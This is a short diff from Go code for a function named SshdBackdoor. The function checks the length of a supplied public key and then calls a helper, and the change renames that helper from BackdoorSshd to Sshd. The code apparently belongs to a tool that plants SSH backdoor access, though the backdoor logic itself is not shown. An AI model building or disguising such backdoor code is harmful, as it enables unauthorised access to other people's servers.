@@ -11,7 +11,7 @@ func SshdBackdoor(pubkey string) error {
 	if len(pubkey) > 450 {
 		return fmt.Errorf("key too long")
 	}
-	if err := BackdoorSshd(pubkey); err != nil {
+	if err := Sshd(pubkey); err != nil {
 		fmt.Println(err)
 		return err
 	}
